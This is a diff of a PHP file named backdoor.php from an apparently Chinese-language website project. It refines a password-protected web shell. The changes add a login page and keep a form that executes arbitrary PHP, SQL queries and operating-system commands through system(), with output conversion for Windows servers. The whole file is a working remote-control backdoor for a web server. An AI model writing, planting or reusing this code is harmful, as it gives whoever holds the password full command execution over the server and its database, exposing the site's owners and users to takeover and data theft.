@@ -1,9 +1,31 @@
 ﻿<?php
 require_once ('config.php');
-require_once ('db.php');
-if ($backdoor_pwd != '' && $_REQUEST ['pwd'] != $backdoor_pwd) {
-	die ( 'Who are you? Password requierd.' );
+if ($backdoor_pwd != '') {
+	if (! isset ( $_POST ['pwd'] ) or  $_POST ['pwd'] != $backdoor_pwd) {
+		die ( '<!doctype html>
+<html>
+<head>
+<title>后门_' . $website_name . '</title>
+<meta charset="utf-8" />
+<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<link rel="stylesheet" type="text/css" href="style/color.css" />
+<link rel="stylesheet" type="text/css" href="style/main.css" />
+</head>
+<body>
+	<div class="select">
+		<h1>请输入密码</h1>
+			<form action="backdoor.php" method="POST">
+			<input type="password" class="cmd" id="input_cmd" name="pwd" value="" autofocus="autofocus" />
+			<input type="submit" value="确定" />
+		</form>
+	</div>
+</body>
+</html>' );
+	}
 }
+
+
+require_once ('db.php');
 function filter($str) {
 	// 转义为HTML Entity
 	$str = trim ( htmlspecialchars ( $str, ENT_QUOTES ) );
@@ -18,60 +40,8 @@ function filter($str) {
 <title>后门_<?php echo $website_name; ?></title>
 <meta charset="utf-8" />
 <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
-<link rel="stylesheet" type="text/css" href="color.css" />
-<style type="text/css">
-body {
-	margin: 0;
-	padding: 0;
-	font-family: Consolas,Monaco,Courier,Monospace;
-}
-
-div.select {
-	padding: 50px;
-	width: 800px;
-	margin: 3em auto 1em auto;
-	border-radius: 1em;
-}
-
-div.console {
-	padding: 20px;
-	margin: 1em 2em auto 2em;
-	//
-	上右下左
-}
-
-form {
-	border-color: #000000;
-	border-width: 1px;
-	border-style: dashed;
-	margin: 0 3em 0 3em;
-	padding: 1em;
-}
-
-input[type="text"] {
-	width: 80%;
-}
-
-th {
-	word-break: normal; /*表头不换行*/
-}
-
-td {
-	border-style: solid;
-	border-width: 1px;
-}
-
-table {
-	font-family: Consolas,"Microsoft YaHei",Monaco,Courier,Monospace;
-	border-style: solid;
-	border-width: 1px;
-	word-wrap: break-word;
-	min-width: 100%;
-}
-pre {
-    font-family: Consolas,"Microsoft YaHei",Monaco,Courier,Monospace;
-}
-</style>
+<link rel="stylesheet" type="text/css" href="style/color.css" />
+<link rel="stylesheet" type="text/css" href="style/main.css" />
 </head>
 
 <body>
@@ -82,16 +52,28 @@ pre {
 			document.getElementById('input_cmd').focus();
 		}
 		</script>
-		<form action="backdoor.php?pwd=<?php echo filter($_GET['pwd'])?>"
+		<form class="withBorder"
+			action="backdoor.php<?php if(isset($_GET['pwd'])){echo '?pwd='. filter($_GET['pwd']);}?>"
 			method="post">
-			<input type="radio" name="type" value="PHP" onclick="setFocus()"
-				<?php if($_POST['type'] == 'PHP'){echo 'checked="checked"';}?> />PHP(需要分号结尾)
-			<input type="radio" name="type" value="SQL" onclick="setFocus()"
-				<?php if($_POST['type'] == 'SQL'){echo 'checked="checked"';}?> />SQL
-			<input type="radio" name="type" value="system" onclick="setFocus()"
-				<?php if($_POST['type'] == 'system'){echo 'checked="checked"';}?> />系统命令
-			<br /> <input type="text" id="input_cmd" name="cmd"
-				value="<?php if ($_POST ['type'] == ''){echo filter($_POST['cmd']);}?>"
+			<input type="hidden" name="pwd" value="<?php echo filter($_POST ['pwd']);?>">
+			<label for="type_php"> <input type="radio" id="type_php" name="type"
+				value="PHP" onclick="setFocus()"
+				<?php if(isset($_POST['type']) && $_POST['type'] == 'PHP'){echo 'checked="checked"';}?> />PHP(需要分号结尾)
+			</label> <label for="type_sql"> <input type="radio" id="type_sql"
+				name="type" value="SQL" onclick="setFocus()"
+				<?php if(isset($_POST['type']) && $_POST['type'] == 'SQL'){echo 'checked="checked"';}?> />SQL
+			</label> <label for="type_system"> <input type="radio"
+				id="type_system" name="type" value="system" onclick="setFocus()"
+				<?php if(isset($_POST['type']) && $_POST['type'] == 'system'){echo 'checked="checked"';}?> />系统命令
+			</label> <br /> <input type="text" class="cmd" id="input_cmd"
+				name="cmd"
+				value="<?php
+				if (! isset ( $_POST ['type'] ) || $_POST ['type'] == '') {
+					if (isset ( $_POST ['cmd'] )) {
+						echo filter ( $_POST ['cmd'] );
+					}
+				}
+				?>"
 				autofocus="autofocus" /> <input type="submit" value="确定" />
 		</form>
 	</div>
@@ -167,16 +149,28 @@ function exePhp($php) {
 	}
 }
 function exeSys($cmd) {
-	echo '系统命令：' . filter ( $cmd ) . '<br/><pre>';
+	if (strstr ( ini_get ( 'disable_functions' ), 'system' )) {
+		echo 'system() 已被禁用。无法执行命令。<br />';
+	}
+	echo '系统命令：' . filter ( $cmd ) . '<br/>';
+	
+	ob_start (); // 将输出的内容被存储在内部缓冲区中，以从GBK转换为UTF-8
 	$ret = system ( $cmd );
-	echo '</pre>';
+	$out = ob_get_contents ();
+	ob_end_clean ();
+	
+	if (strtoupper ( substr ( PHP_OS, 0, 3 ) ) === 'WIN') {
+		echo '检测到服务器为Windows系统，正在将输出从GBK转码为UTF-8<br />';
+		$out = iconv ( 'GBK', 'UTF-8', $out ); // 从GBK转码为UTF-8
+	}
+	echo '<pre>' . filter ( $out ) . '</pre>';
 	// system():成功则返回命令输出的最后一行， 失败则返回 FALSE
 	if ($ret === false) {
 		echo '<span class="fail">命令执行失败。</span><br />';
 	}
 }
 
-if ($_POST ['cmd'] == '') {
+if (! isset ( $_POST ['cmd'] ) || $_POST ['cmd'] == '') {
 	echo '等待命令。<br />';
 } elseif ($_POST ['type'] == '') {
 	echo '<span class="fail">请选择命令类型！</span><br />';
